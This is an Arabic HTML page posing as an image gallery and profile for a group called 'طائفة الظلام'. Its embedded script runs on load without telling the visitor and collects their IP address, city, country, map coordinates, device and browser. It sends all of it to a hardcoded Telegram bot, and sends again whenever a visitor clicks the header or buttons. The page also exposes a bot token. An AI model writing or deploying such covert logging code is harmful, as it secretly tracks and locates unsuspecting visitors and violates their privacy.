<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>طائفة الظلام - DKSTx666</title>
  <style>
    body {
      margin: 0;
      background: radial-gradient(circle, pink 20%, #ffccff);
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      overflow-x: hidden;
      position: relative;
    }

    .top-description {
      background: linear-gradient(90deg, #4b0082, black, #4b0082);
      color: white;
      padding: 15px;
      font-weight: bold;
      font-size: 16px;
      animation: fadeInOut 5s ease-in-out infinite;
    }

    @keyframes fadeInOut {
      0%, 100% { opacity: 0.1; }
      50% { opacity: 1; }
    }

    header {
      background-image: url('5alfia.png');
      background-size: cover;
      background-position: center;
      height: 250px;
      position: relative;
    }

    .profile-pic {
      width: 110px;
      height: 110px;
      border-radius: 50%;
      border: 5px solid white;
      background-image: url('profile.png');
      background-size: cover;
      background-position: center;
      position: absolute;
      bottom: -55px;
      right: 20px;
      animation: pulse 2s infinite;
      box-shadow: 0 0 10px purple;
      cursor: pointer;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0.7); }
      70% { box-shadow: 0 0 0 15px rgba(255, 255, 0, 0); }
      100% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0); }
    }

    .posts-container {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 10px;
      padding: 80px 10px 30px;
    }

    .post-img {
      width: 100%;
      height: 100px;
      object-fit: cover;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.3s, box-shadow 0.3s;
    }

    .post-img:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px #800080;
    }

    .lightbox {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
      flex-direction: column;
    }

    .lightbox img {
      max-width: 90%;
      max-height: 80%;
      border-radius: 10px;
      margin-bottom: 20px;
    }

    .lightbox:target {
      display: flex;
    }

    .close-btn {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 30px;
      color: white;
      text-decoration: none;
    }

    .download-btn {
      background-color: purple;
      color: white;
      padding: 10px 20px;
      border-radius: 10px;
      text-decoration: none;
      font-size: 16px;
    }

    .video-fab {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background-color: red;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      box-shadow: 0 0 15px red;
      animation: pulse 2s infinite;
      cursor: pointer;
      z-index: 1000;
    }

    .blog-fab {
      position: fixed;
      bottom: 20px;
      left: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background-color: yellow;
      color: black;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      box-shadow: 0 0 15px yellow;
      animation: pulse 2s infinite;
      cursor: pointer;
      z-index: 1000;
    }

    .pagination {
      margin-top: 20px;
    }

    .pagination a {
      margin: 0 5px;
      text-decoration: none;
      font-size: 18px;
      color: purple;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="top-description">
    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير | 
    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم | 
    لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
  </div>

  <header onclick="goToIndex()">
    <div class="profile-pic"></div>
  </header>

  <div class="posts-container">
    <a href="#img1"><img src="img1.png" class="post-img"></a>
    <a href="#img2"><img src="img2.png" class="post-img"></a>
    <a href="#img3"><img src="img3.png" class="post-img"></a>
    <a href="#img4"><img src="img4.png" class="post-img"></a>
    <a href="#img5"><img src="img5.png" class="post-img"></a>
  </div>

  <div id="img1" class="lightbox">

    <img src="img1.png">
    <a href="img1.png" download class="download-btn">تحميل الصورة</a>

  <div class="pagination">
    <a href="index1.html">1</a>
    <a href="index2.html">2</a>

  </div>

  <div class="video-fab" onclick="goToIndex()">🎥</div>
  <div class="blog-fab" onclick="goToIndex()">📖</div>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";
    let report = "🛑 تقرير دخول جديد:\n\n";

    function getIPInfo() {
      return fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(data => {
          report += `🌐 IP: ${data.ip || "❌"}\n`;
          report += `📍 الدولة: ${data.country || "❌"}\n`;
          report += `🏙️ المدينة: ${data.city || "❌"}\n`;
          report += `🌎 إحداثيات: ${data.loc || "❌"}\n`;
          report += `🛰️ خريطة: https://www.google.com/maps?q=${data.loc || ""}\n\n`;
        })
        .catch(() => {
          report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
        });
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      report += `🧠 UserAgent: ${ua}\n`;

      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
      else report += "🌀 الجهاز: غير معروف ❌\n";

      if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome ✅\n";
      else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox ✅\n";
      else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari ✅\n";
      else report += "🌐 المتصفح: غير معروف ❌\n";

      report += "\n";
    }

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
      });
    }

    async function runReport() {
      await getIPInfo();
      getDeviceInfo();
      sendToTelegram(report);
    }

    runReport();

    function goToIndex() {
      fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(data => {
          const msg = `🎬 دخول إلى index.html:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`;
          sendToTelegram(msg);
          window.location.href = "index.html";
        });
    }
  </script>
